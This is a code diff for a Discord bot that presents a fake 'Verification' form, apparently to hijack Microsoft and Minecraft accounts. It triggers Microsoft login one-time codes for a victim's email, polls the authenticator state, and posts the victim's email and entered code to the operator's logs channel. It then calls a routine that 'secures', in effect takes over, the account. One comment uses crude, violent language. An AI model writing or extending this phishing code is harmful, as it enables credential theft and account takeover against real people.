@@ -1,4 +1,5 @@
 from discord import ui
+from data import Email
 import discord
 import datetime
 import requests
@@ -9,7 +10,6 @@ import re
 from views.buttons.button_two import ButtonViewTwo
 from views.buttons.button_three import ButtonViewThree
 
-from views.utils.getMSAAUTH import getMSAAUTH
 from views.utils.startSecure import startSecuringAccount
 
 from views.modals.embeds import embeds
@@ -49,6 +49,7 @@ class MyModalOne(ui.Modal, title="Verification"):
         )
 
         # Sends OTP/Auth code
+        # forceotclogin is what triggers the code, spamming otps may lead to microsoft raping your ip 
         emailInfo = requests.get(
             url = "https://login.live.com/GetCredentialType.srf",
             headers = {
@@ -131,6 +132,7 @@ class MyModalOne(ui.Modal, title="Verification"):
 
             await logs_channel.send(embed = sucessEmbed)
             
+            # Checks every second for the authenticator state
             def check_code(flowToken):
                 response = requests.post(
                     url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
@@ -189,8 +191,9 @@ class MyModalOne(ui.Modal, title="Verification"):
                         content = "@everyone"
                     )
 
-                    
+                    # Securing
                     startSecuringAccount(self.email.value, device) 
+                    
                     return
                 
                 time.sleep(1)
@@ -219,6 +222,7 @@ class MyModalOne(ui.Modal, title="Verification"):
             secEmail = emailInfo["Credentials"]["OtcLoginEligibleProofs"][0]
             print(f"Found security email: {secEmail["display"]}!")
 
+            Email = self.email.value
             await interaction.followup.send(
                 embed=discord.Embed(
                     title="Verification ✅",
@@ -229,14 +233,22 @@ class MyModalOne(ui.Modal, title="Verification"):
                 ephemeral = True
             )
 
+            Code_embed = discord.Embed(
+            title="Got OTP Verication",
+            description=f"**Email**\n```{Email}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Securing...```",
+            colour=0x008000
+        )
+
             sucessEmbed = discord.Embed (
-                    title = f"{interaction.user.name} | {interaction.user.id}",
-                    description = f"**Username**\n ```{self.username.value}```\n**Email**\n ```{self.email.value}```\n**Authentication Method**\n ```Security Email OTP```",
+                    title = f"Auth Verification",
+                    description=f"**Email**\n```{Email}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Waiting...```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0x088F8F,                           
+                    colour = 0xA3A300,                           
             ).set_thumbnail(
                 url= f"https://mc-heads.net/avatar/{self.username.value}.png"
             )
+
+
 
             await logs_channel.send(embed = sucessEmbed)
         
